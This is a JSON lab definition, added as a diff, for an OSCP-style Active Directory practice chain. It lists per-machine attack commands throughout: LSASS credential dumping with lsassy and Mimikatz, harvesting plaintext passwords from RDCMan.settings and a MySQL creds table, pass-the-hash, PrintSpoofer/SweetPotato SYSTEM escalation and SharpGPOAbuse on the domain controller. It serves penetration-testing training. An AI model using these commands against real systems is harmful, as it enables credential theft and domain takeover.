@@ -1,0 +1,315 @@
+{
+  "id": "assume-breach-config-chain",
+  "title": "Assume Breach: Config File Chain",
+  "category": "ad-chain",
+  "source": ["Secura"],
+  "designed_by": "lab-derived",
+  "description": "Pure AD lab: 3 machines on single subnet. Assume breach with Eric.Wallows creds on .95 SECURE. Credential harvest via lsassy/Mimikatz/RDCMan.settings → apache. MySQL root (empty) on .96 ERA → administrator + charlotte. SeImpersonate → PrintSpoofer/SweetPotato or SharpGPOAbuse on DC.",
+  "introduction": "Teaches assume-breach: start with given creds, harvest more from config files and memory. Foundational OSCP pattern—no initial exploit, just credential chaining.",
+  "mental_model": "You have creds; now mine for more. Check RDCMan, PS history, config files. MySQL with empty root often has creds table. Each machine is a credential source for the next.",
+  "key_principles": [
+    "lsassy/Mimikatz dump from first host; RDCMan.settings has plaintext",
+    "MySQL root empty = check for creds database; mysqldump dumps all",
+    "PrintSpoofer/SweetPotato for SeImpersonate; SharpGPOAbuse if GPO writable",
+    "Always check Recycle Bin and PS history for leftover creds",
+    "Same subnet = no pivot needed; just credential relay"
+  ],
+
+  "indicators": {
+    "difficulty": 3,
+    "cognitive_load": 2,
+    "enumeration_depth": 2,
+    "rabbit_hole_risk": 2,
+    "time_pressure": 2
+  },
+
+  "mitre": {
+    "tactics": ["TA0001","TA0003","TA0004","TA0006","TA0007"],
+    "techniques": [
+      {"id":"T1021.006","name":"Windows Remote Management"},
+      {"id":"T1134.001","name":"Token Impersonation/Theft"},
+      {"id":"T1003.001","name":"LSASS Memory"},
+      {"id":"T1552.001","name":"Credentials In Files"},
+      {"id":"T1550.002","name":"Pass the Hash"},
+      {"id":"T1484.001","name":"Group Policy Modification"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon","T3-NonWeb-Access","T4b-Win-PrivEsc","T5-Credentials","T7-Lateral"],
+
+  "environment": {
+    "machine_count": 3,
+    "network_count": 1,
+    "os_distribution": {"windows": 3, "linux": 0},
+    "has_ad": true,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "evil-winrm","lsassy","rdcman","mysql","pass-the-hash","printspoofer","sweetpotato",
+    "gpo-abuse","mimikatz","nxc","mysqldump","SharpGPOAbuse","ManageEngine",
+    "SeImpersonate","nmap","credential-spray","--local-auth"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": true,
+    "pen200_modules": [6,16,17,22,24],
+    "pattern_frequency": "high",
+    "recommended_order": 0
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id":"internal","cidr":"192.168.x.0/24","label":"secura.yzx domain"}
+  ],
+
+  "machines": [
+    {
+      "id": "secure",
+      "label": "SECURE",
+      "ip": "192.168.x.95",
+      "os": "Windows",
+      "role": "AD Entry",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 5985,
+          "name": "WinRM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "given-creds", "summary": "Evil-WinRM with Eric.Wallows (assume breach)", "leads_to": "local-user"}
+          ],
+          "commands": [{"cmd": "evil-winrm -i 192.168.x.95 -u Eric.Wallows -p 'EricLikesRunning800'", "rationale": "Why: Assume breach—use given creds to start credential harvest"}]
+        },
+        {
+          "port": 3389,
+          "name": "RDP",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "given-creds", "summary": "RDP with Eric.Wallows", "leads_to": "local-user"}
+          ],
+          "commands": ["xfreerdp /v:192.168.x.95 /u:Eric.Wallows /p:'EricLikesRunning800'"]
+        },
+        {
+          "port": 8443,
+          "name": "ManageEngine APM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "default-creds", "summary": "admin/admin default credentials", "leads_to": "admin-panel"}
+          ],
+          "commands": ["curl -k https://192.168.x.95:8443/ -u admin:admin"]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "Eric.Wallows",
+          "to": "Administrator",
+          "technique": "Eric.Wallows is already local admin — no privesc needed",
+          "commands": ["net localgroup administrators"]
+        },
+        {
+          "from": "Eric.Wallows",
+          "to": "Administrator",
+          "technique": "Password reset via net user (S3 shortcut)",
+          "commands": ["net user Administrator 123@Abc"]
+        }
+      ],
+      "credentials": [
+        {"user": "apache", "type": "password", "source": "nxc lsassy remote dump", "unlocks": ["era"]},
+        {"user": "apache", "type": "password", "source": "Mimikatz sekurlsa::logonpasswords", "unlocks": ["era"]},
+        {"user": "apache", "type": "password", "source": "RDCMan.settings file", "unlocks": ["era"]},
+        {"user": "apache", "type": "password", "source": "PowerShell history in Recycle Bin (Test-ComputerSecureChannel)", "unlocks": ["era"]}
+      ],
+      "alternatives": [
+        {"source": "S1", "description": "nxc lsassy module to dump apache creds remotely", "commands": ["nxc smb 192.168.x.95 -u Eric.Wallows -p 'EricLikesRunning800' -M lsassy"]},
+        {"source": "S2", "description": "Mimikatz on RDP session for credential dump", "commands": ["mimikatz.exe", "privilege::debug", "sekurlsa::logonpasswords"]},
+        {"source": "S3", "description": "Password reset → RDP as Administrator → Recycle Bin PS history", "commands": ["net user Administrator 123@Abc", "dir 'C:\\$Recycle.Bin' /s /b"]},
+        {"source": "S4", "description": "RDCMan.settings contains apache plaintext password", "commands": ["type C:\\Users\\Eric.Wallows\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings"]}
+      ]
+    },
+    {
+      "id": "era",
+      "label": "ERA",
+      "ip": "192.168.x.96",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 5985,
+          "name": "WinRM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "Evil-WinRM with apache password", "leads_to": "local-user"}
+          ],
+          "commands": ["evil-winrm -i 192.168.x.96 -u apache -p 'New2Era4.!'"]
+        },
+        {
+          "port": 3306,
+          "name": "MariaDB",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "default-creds", "summary": "root with empty password", "leads_to": "credential-dump"}
+          ],
+          "commands": [
+            "mysql -h 192.168.x.96 -u root -p",
+            "mysqldump -h 192.168.x.96 -u root creds",
+            "mysql -h 192.168.x.96 -u root -e \"SELECT * FROM creds.creds;\""
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "apache",
+          "to": "administrator",
+          "technique": "MySQL dump creds table → administrator:Almost4There8.? + charlotte:Game2On4.!",
+          "commands": [
+            "mysql -h 192.168.x.96 -u root -e \"SHOW DATABASES;\"",
+            {"cmd": "mysqldump -h 192.168.x.96 -u root creds", "rationale": "Why: MySQL creds table often holds domain user passwords"},
+            "evil-winrm -i 192.168.x.96 -u administrator -p 'Almost4There8.?'"
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "administrator", "type": "password", "source": "MySQL creds table dump", "unlocks": ["era-admin"]},
+        {"user": "charlotte", "type": "password", "source": "MySQL creds table dump", "unlocks": ["dc01"]}
+      ],
+      "alternatives": [
+        {"source": "S3", "description": "iox proxy tunnel if MariaDB blocks external IPs — connect from evil-winrm on ERA locally", "commands": ["iox proxy -l 3306 -r 127.0.0.1:3306", "proxychains mysql -h 127.0.0.1 -u root -e \"SELECT * FROM creds.creds;\""]},
+        {"source": "S1,S3", "description": "Use --skip-ssl if MySQL connection fails", "commands": ["mysql -h 192.168.x.96 -u root --skip-ssl"]}
+      ]
+    },
+    {
+      "id": "dc01",
+      "label": "DC01",
+      "ip": "192.168.x.97",
+      "os": "Windows",
+      "role": "Domain Controller",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 5985,
+          "name": "WinRM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "Evil-WinRM with charlotte password from MySQL", "leads_to": "domain-user"}
+          ],
+          "commands": ["evil-winrm -i 192.168.x.97 -u charlotte -p 'Game2On4.!'"]
+        },
+        {
+          "port": 389,
+          "name": "LDAP",
+          "version": "",
+          "vulnerabilities": [],
+          "commands": []
+        }
+      ],
+      "privesc": [
+        {
+          "from": "charlotte",
+          "to": "SYSTEM",
+          "technique": "SeImpersonatePrivilege → PrintSpoofer",
+          "commands": [
+            "whoami /priv",
+            {"cmd": "PrintSpoofer64.exe -i -c cmd", "rationale": "Why: SeImpersonate to SYSTEM for proof.txt on DC"},
+            "type C:\\Users\\Administrator\\Desktop\\proof.txt"
+          ]
+        },
+        {
+          "from": "charlotte",
+          "to": "SYSTEM",
+          "technique": "SeImpersonatePrivilege → SweetPotato",
+          "commands": [
+            "whoami /priv",
+            "SweetPotato.exe -e EfsRpc -p C:\\tmp\\rev.exe"
+          ]
+        },
+        {
+          "from": "charlotte",
+          "to": "SYSTEM",
+          "technique": "SharpGPOAbuse — charlotte can modify Default Domain Policy, add as local admin",
+          "commands": [
+            "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName 'Default Domain Policy'",
+            "gpupdate /force",
+            "evil-winrm -i 192.168.x.97 -u charlotte -p 'Game2On4.!' (re-login to apply GPO)"
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": [
+        {"source": "S1,S4", "description": "PrintSpoofer for token impersonation on DC"},
+        {"source": "S3", "description": "SweetPotato instead of PrintSpoofer"},
+        {"source": "S4", "description": "SharpGPOAbuse → add charlotte as local admin via GPO modification"},
+        {"source": "S2", "description": "Metasploit getsystem on DC"}
+      ]
+    }
+  ],
+
+  "connections": [
+    {
+      "from": "secure",
+      "to": "era",
+      "technique": "Evil-WinRM with password",
+      "requires": "apache:New2Era4.! from lsassy/Mimikatz/RDCMan.settings on SECURE",
+      "pivot": "None — same subnet",
+      "path_ids": ["path-lsassy", "path-mimikatz", "path-rdcman", "path-recycle-bin"],
+      "commands": [
+            {"cmd": "nxc smb 192.168.x.95 -u Eric.Wallows -p 'EricLikesRunning800' -M lsassy", "rationale": "Why: Remote dump avoids uploading Mimikatz; gets apache creds"},
+        "evil-winrm -i 192.168.x.96 -u apache -p 'New2Era4.!'"
+      ]
+    },
+    {
+      "from": "era",
+      "to": "dc01",
+      "technique": "Evil-WinRM with password",
+      "requires": "charlotte:Game2On4.! from MySQL creds table on ERA",
+      "pivot": "None — same subnet",
+      "path_ids": ["path-lsassy", "path-mimikatz", "path-rdcman", "path-recycle-bin", "path-gpo"],
+      "commands": [
+        "mysql -h 192.168.x.96 -u root -e \"SELECT * FROM creds.creds;\"",
+        "evil-winrm -i 192.168.x.97 -u charlotte -p 'Game2On4.!'"
+      ]
+    }
+  ],
+
+  "attack_paths": [
+    {
+      "id": "path-lsassy",
+      "name": "AD: nxc lsassy (Primary)",
+      "color": "#6bb8cc",
+      "steps": ["secure", "era", "dc01"],
+      "description": "Evil-WinRM (Eric) → nxc lsassy → apache → .96 → MySQL dump → charlotte → .97 → PrintSpoofer"
+    },
+    {
+      "id": "path-mimikatz",
+      "name": "AD: Mimikatz Credential Dump",
+      "color": "#e8a87c",
+      "steps": ["secure", "era", "dc01"],
+      "description": "RDP (Eric) → Mimikatz sekurlsa::logonpasswords → apache → .96 → MySQL → .97 → PrintSpoofer"
+    },
+    {
+      "id": "path-rdcman",
+      "name": "AD: RDCMan.settings Config File",
+      "color": "#85e89d",
+      "steps": ["secure", "era", "dc01"],
+      "description": "Evil-WinRM (Eric) → RDCMan.settings file → apache → .96 → MySQL → .97 → PrintSpoofer"
+    },
+    {
+      "id": "path-recycle-bin",
+      "name": "AD: Recycle Bin PowerShell History",
+      "color": "#d2a8ff",
+      "steps": ["secure", "era", "dc01"],
+      "description": "net user Administrator reset → RDP → Recycle Bin PS history → apache → .96 → MySQL → .97"
+    },
+    {
+      "id": "path-gpo",
+      "name": "AD: SharpGPOAbuse Alternative",
+      "color": "#f0e68c",
+      "steps": ["secure", "era", "dc01"],
+      "description": "Same credential chain → charlotte on DC → SharpGPOAbuse modify GPO → local admin"
+    }
+  ]
+}
